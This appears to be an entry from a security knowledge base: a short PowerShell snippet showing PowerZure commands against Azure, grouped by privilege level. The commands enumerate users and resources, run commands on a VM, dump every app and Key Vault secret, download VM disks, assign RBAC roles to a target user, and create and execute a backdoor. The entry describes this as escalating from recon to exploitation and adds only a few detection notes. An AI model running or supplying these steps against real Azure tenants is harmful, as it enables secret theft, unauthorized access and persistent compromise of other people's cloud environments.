---
id: 2a6bb5e2-85ee-4064-b8a2-a2cce5a791d3
type: code
language: powershell
verified: true
created_at: '2023-04-06T03:56:14.586356+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Azure
tags:
  - powerzure
  - roles
validated: true
---

# powerzure-role-based-commands-script

## Code

```powershell
# Require az module !
$ ipmo .\PowerZure
$ Set-Subscription -Id [idgoeshere]

# Reader
$ Get-Runbook, Get-AllUsers, Get-Apps, Get-Resources, Get-WebApps, Get-WebAppDetails

# Contributor
$ Execute-Command -OS Windows -VM Win10Test -ResourceGroup Test-RG -Command "whoami"
$ Execute-MSBuild -VM Win10Test  -ResourceGroup Test-RG -File "build.xml"
$ Get-AllSecrets # AllAppSecrets, AllKeyVaultContents
$ Get-AvailableVMDisks, Get-VMDisk # Download a virtual machine's disk

# Owner
$ Set-Role -Role Contributor -User test@contoso.com -Resource Win10VMTest

# Administrator
$ Create-Backdoor, Execute-Backdoor
```

## Description

PowerZure script showcasing role-based commands: Reader for enum, Contributor for execution/secrets, Owner for RBAC, Admin for persistence. Requires az module.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| [idgoeshere] | Subscription ID | guid-here |
| Win10Test | VM name | actual-vm |
| Test-RG | Resource group | actual-rg |
| test@contoso.com | User | target-user |

## Usage

Import PowerZure.psm1, set subscription, then run commands per role. Escalates recon to exploitation based on privileges.

## Detection

- Az module usage with PowerZure imports.
- RBAC changes or VM run commands in audit logs.
- Secret retrieval from Key Vaults.

## Related

- [[procedures/Azure-Reconnaissance]]
- [[tools/PowerZure]]
